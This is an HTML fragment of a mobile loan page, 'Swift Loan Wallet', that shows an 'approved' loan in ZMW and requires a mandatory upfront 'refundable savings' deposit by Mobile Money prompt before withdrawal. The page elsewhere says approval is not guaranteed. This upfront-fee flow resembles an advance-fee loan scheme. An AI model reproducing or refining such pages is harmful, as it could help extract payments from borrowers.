      <main class="max-w-md mx-auto px-4 py-6 mb-16">
          <!-- Wallet Card -->
          <div class="wallet-card rounded-2xl p-4 text-white shadow-lg mb-3 relative overflow-hidden">
              <div class="absolute top-0 right-0 w-24 h-24 bg-white/10 rounded-full -mr-8 -mt-8 blur-xl"></div>
              <div class="absolute bottom-0 left-0 w-20 h-20 bg-black/10 rounded-full -ml-8 -mb-8 blur-lg"></div>
              
              <div class="relative z-10">
                  <div class="wallet-card-topline">
                      <span>Swift Loan Wallet</span>
                      <div class="wallet-contactless" aria-hidden="true">
                          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path stroke-linecap="round" stroke-width="1.8" d="M8.5 15.5a5 5 0 0 0 0-7M12 18a8.5 8.5 0 0 0 0-12M15.5 20.5a12 12 0 0 0 0-17"/>
                          </svg>
                          <span>READY</span>
                      </div>
                  </div>
                  <div class="wallet-chip" aria-hidden="true"></div>
                  <div class="flex justify-between items-start mb-3">
                      <div>
                          <p class="text-white/80 text-xs font-medium mb-1">Approved Loan Amount</p>
                          <h2 class="text-2xl font-bold flex items-center">
                              ZMW <span id="displayLoanAmount">0</span>
                          </h2>
                      </div>
                      <div class="bg-white/20 px-2 py-1 rounded-full backdrop-blur-sm border border-white/30 cursor-pointer hover:bg-white/30 transition-colors" id="changeNetworkBtn">
                          <span class="text-[10px] font-semibold" id="displayNetwork">MTN</span>
                      </div>
                  </div>
                  
                  <div class="grid grid-cols-2 gap-3 mt-3 pt-3 border-t border-white/20">
                      <div>
                          <p class="text-white/70 text-[10px] mb-0.5">Savings</p>
                          <p class="font-semibold text-base">ZMW <span id="displayFee">0</span></p>
                      </div>
                      <div>
                          <p class="text-white/70 text-[10px] mb-0.5">Receiving Number</p>
                          <div class="flex items-center">
                              <p class="font-semibold text-base" id="displayPhone">260---------</p>
                              <button class="ml-1 text-white/80 hover:text-white" id="editPhoneIconBtn">
                                  <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg>
                              </button>
                          </div>
                      </div>
                  </div>

                  <div class="mt-3 pt-3 border-t border-white/20">
                      <p class="text-white/70 text-[10px] mb-1.5">Customer Name(confirm if its yours/edit if not to avoid errors) <span class="text-red-300">*</span></p>
                      <div class="flex items-center justify-between bg-white/10 px-2.5 py-1.5 rounded-lg">
                          <p class="font-semibold text-sm text-white" id="displayCustomerName">Name not set</p>
                          <button class="text-white/80 hover:text-white" id="editNameIconBtn">
                              <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg>
                          </button>
                      </div>
                       <div class="flex items-center justify-between mt-2 px-2.5">
                           <span class="text-white/70 text-[10px]">Email</span>
                           <span class="font-medium text-xs text-white/90 truncate ml-3" id="displayCustomerEmail">Email not set</span>
                       </div>
                  </div>
              </div>
          </div>

          <p class="text-center text-sm text-gray-500 mb-6 px-2">Review the refundable savings deposit and loan terms before requesting a Mobile Money payment prompt. Refunds follow the stated terms if the loan is not approved or after repayment is complete.</p>

          <!-- Main Card area (Payment Link Container) -->
          <div class="card" id="mainCard" style="max-width: 100%;">
              <!-- Initial State / Withdraw Button -->
              <div id="formSection">
                  <button class="btn-deposit w-full font-bold" id="withdrawLoanBtn" style="text-transform: uppercase;">
                      Withdraw my loan - ZMW <span id="btnAmountDisplay">0</span>
                  </button>
                  <div class="withdrawal-savings-summary" role="status" aria-live="polite">
                      <span class="withdrawal-savings-label">Savings payment required:</span>
                      <strong>ZMW <span id="withdrawalSavingsDisplay">0.00</span></strong>
                      <small>Review the loan and savings terms below before continuing. </small>
                  </div>
              </div>

              <!-- Processing State -->
              <div id="processingSection" class="loader-container hidden" aria-live="polite" aria-atomic="true">
                  <div id="paymentStatusVisual" class="stk-status-visual" data-state="pending" aria-hidden="true">
                      <div class="stk-pending-visual">
                          <div class="stk-orbit">
                              <div class="stk-orbit-track"><span class="stk-orbit-dot"></span></div>
                              <div class="stk-orbit-core"><img src="swiftloan-processing-logo.png" alt="Swift Loan" /></div>
                          </div>
                      </div>
                      <div class="stk-transfer-visual">
                          <div class="stk-transfer-node">
                              <span class="stk-transfer-node-icon">
                                  <svg fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><rect x="6" y="2.8" width="12" height="18.4" rx="2.4"></rect><path stroke-linecap="round" d="M10 6h4M11 18h2"></path></svg>
                              </span>
                              <span>Mobile money</span>
                          </div>
                          <div class="stk-transfer-track"><span class="stk-money-token">K</span></div>
                          <div class="stk-transfer-node">
                              <span class="stk-transfer-node-icon">
                                  <svg fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="14" rx="2"></rect><path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h4"></path></svg>
                              </span>
                              <span>Payza</span>
                          </div>
                      </div>
                      <div class="stk-success-visual">
                          <div class="stk-result-icon">
                              <svg fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="m5 12.5 4.5 4.5L19 7"></path></svg>
                          </div>
                          <div class="stk-confetti"><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i></div>
                      </div>
                      <div class="stk-failure-visual">
                          <div class="stk-result-icon">
                              <svg fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M12 8v5m0 4h.01"></path><path d="M10.3 3.9 1.9 18.1A2 2 0 0 0 3.6 21h16.8a2 2 0 0 0 1.7-2.9L13.7 3.9a2 2 0 0 0-3.4 0Z"></path></svg>
                          </div>
                      </div>
                  </div>
                  <div class="stk-progress-track" role="progressbar" aria-label="Payza payment status" aria-valuemin="0" aria-valuemax="100" aria-valuetext="Waiting for payment status">
                      <div id="paymentProgressFill" class="stk-progress-fill" data-state="pending"></div>
                  </div>
                  <p id="paymentSentTo" class="payment-sent-to" aria-live="polite">Payment prompt sent to your phone</p>
                  <h2 style="margin: 0 0 7px; color: #00e1ff; font-weight: 700;" id="processingTitle">Processing your mobile-money Savings...</h2>
                  <p style="color: #64748b; font-size: 14px; margin-bottom: 16px;" id="paymentLinkMessage">
                      Preparing your Payza payment request...
                  </p>
                  <p id="paymentStatusHint" style="color: var(--text-muted); font-size: 12px;">Keep your phone nearby. Never share your mobile-money PIN to anyone.</p>

                  <!-- Live payment and loan summary -->
                  <div class="processing-details" aria-label="Payment and loan details">
                      <h3>Application & payment details</h3>
                      <div class="processing-detail-row"><span>Loan amount</span><strong id="processingLoanAmount">ZMW 0.00</strong></div>
                      <div class="processing-detail-row"><span>Required savings payment</span><strong id="processingSavingsAmount">ZMW 0.00</strong></div>
                      <div class="processing-detail-row"><span>Mobile Money number</span><strong id="processingPhoneNumber">Not available</strong></div>
                      <div class="processing-detail-row"><span>Network</span><strong id="processingNetwork">Not available</strong></div>
                      <div class="processing-detail-row"><span>Payment reference</span><strong id="processingReference">Will be generated</strong></div>
                      <div class="processing-instructions">
                          <h4>What to do now</h4>
                          <ol>
                              <li>Keep the SIM card for the number shown above active and close to you.</li>
                              <li>Wait for the Mobile Money payment request to appear on that phone.</li>
                              <li>Check that the requested payment is the savings amount shown above before approving.</li>
                              <li>Enter your PIN only in the official Mobile Money prompt on your phone. Never tell it to anyone or enter it on this website.</li>
                              <li>Return to this page and wait while the payment provider verifies the transaction.</li>
                              <li>Do not refresh the page or submit another payment while this request is being checked. If no prompt arrives, contact support before trying again.</li>
                          </ol>
                      </div>
                      <p class="processing-security-note">The savings amount is the payment being requested; it is separate from the loan amount. A payment prompt does not mean the loan has been approved or disbursed. Final loan decisions and any refund are subject to the written loan terms.</p>
                  </div>
              </div>
          </div>

          <!-- Instructions -->
          <div class="mt-8 bg-white rounded-xl shadow-sm border border-gray-100 p-5">
              <h3 class="font-bold text-lg text-gray-800 mb-4 text-center">Deposit Savings</h3>
               <h4 class="font-semibold text-gray-700 text-center mb-3">Savings Required</h4>
              
              <div class="bg-amber-50 border-l-4 border-amber-500 p-4 mb-4 rounded-r-lg">
                  <p class="text-amber-800 text-sm font-medium">
                       <strong>Why do I need to provide savings?</strong><br>
                       This refundable savings deposit supports your loan application. If your loan is not approved, it will be refunded. If approved, it will be refunded after you complete repayment, according to the loan terms.
                  </p>
              </div>
              
              <p class="text-gray-600 text-sm leading-relaxed text-center mb-4">
                  This is <span class="font-bold text-gray-800" style="color: #1e3a8a;">mandatory for all applicants</span> and is <span class="font-bold" style="color: #ea580c;">charged only once for first-time users</span>.
              </p>
              
              <p class="font-bold text-center text-sm mb-5" style="color: #ea580c;">
                   <strong>If your loan is not approved, the savings is refunded. If approved, it is refunded after full repayment, according to the loan terms.</strong>
              </p>
              
              <div class="bg-blue-50/50 rounded-lg p-4 space-y-3">
